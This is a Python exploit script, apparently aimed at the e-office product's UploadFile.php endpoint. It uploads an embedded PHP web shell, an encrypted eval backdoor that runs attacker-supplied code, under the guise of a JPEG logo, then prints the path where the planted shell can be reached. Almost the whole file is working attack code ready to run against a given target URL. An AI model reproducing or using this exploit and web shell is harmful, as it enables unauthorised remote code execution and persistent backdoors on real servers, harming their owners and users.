#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
import sys
import json
import os
import time
import string
import argparse
import readchar
import random
from requests_toolbelt.multipart.encoder import MultipartEncoder


banner ='''     
 ______           ______  ______  ______  ________  ______  ______      
/_____/\         /_____/\/_____/\/_____/\/_______/\/_____/\/_____/\     
\::::_\/_  ______\:::_ \ \::::_\/\::::_\/\__.::._\/\:::__\/\::::_\/_    
 \:\/___/\/______/\:\ \ \ \:\/___/\:\/___/\ \::\ \  \:\ \  _\:\/___/\   
  \::___\/\__::::\/\:\ \ \ \:::._\/\:::._\/ _\::\ \__\:\ \/_/\::___\/_  
   \:\____/\        \:\_\ \ \:\ \   \:\ \  /__\::\__/\\:\_\ \ \:\____/\ 
    \_____\/         \_____\/\_\/    \_\/  \________\/ \_____\/\_____\/ 
                                                                 
                                                        https://github.com/bigsizeme/                                                        
                                                        '''
print(banner)
proxies = {'http': 'http://127.0.0.1:8099', 'https': 'http://127.0.0.1:8099'}

def random_string_generator(str_size, allowed_chars):
    return ''.join(random.choice(allowed_chars) for x in range(str_size))
chars = string.ascii_letters


def getPath(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    temp = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    target = url+temp
    shellCode = '''<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {eval($p."");}}
	@new C($params);
}
?>'''
    headers = {'Content-Type': 'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','X-Requested-With':'XMLHttpRequest','Content-Length':'606'}

    multipart_encoder = MultipartEncoder(
        fields={
            "Filedata": (
            "b.php", shellCode, 'image/jpeg'),
            "typeStr": "File"
        },
        boundary='e64bdf16c554bbc109cecef6451c26a4'
    )   
    response = requests.post(url=target,headers=headers,data=multipart_encoder,proxies=proxies,verify=False)

    if response.status_code ==200:
        null =""
        text =response.text
        print(text)
        return text
    else:
        print("error")


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog="\tExample: \r\npython " + sys.argv[0] + " -u target")
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--url', help="Target url.", default="http://127.0.0.1:8080", required=True)
    parser.add_argument('-c', '--cmd', help="Commond", default="whoami", required=False)
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    url = args.url
    if url.endswith("/"):
        url = url[:-1]
        print(url)
    cmd = args.cmd
    path = getPath(url)
    if path=='logo-eoffice.php':
        print("shell path: "+url+"/images/logo/logo-eoffice.php?pass")
   # print("\nvul:%s url:%s\t\n" %(str(r["vul"]),url))


